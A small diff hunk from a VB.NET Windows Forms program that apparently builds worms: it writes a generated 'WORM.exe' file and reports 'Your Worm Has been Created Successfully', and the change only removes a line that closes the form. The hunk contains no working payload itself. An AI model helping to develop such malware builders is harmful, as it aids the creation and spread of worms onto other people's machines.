@@ -791,7 +791,6 @@ Public Class Form1
                 definition.Write(Application.StartupPath + "\" + "WORM.exe")
                 MsgBox("Your Worm Has been Created Successfully", vbInformation, "DONE!")
                 My.Settings.Save()
-                Me.Close()
             Catch ex1 As Exception
                 MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
                 Return
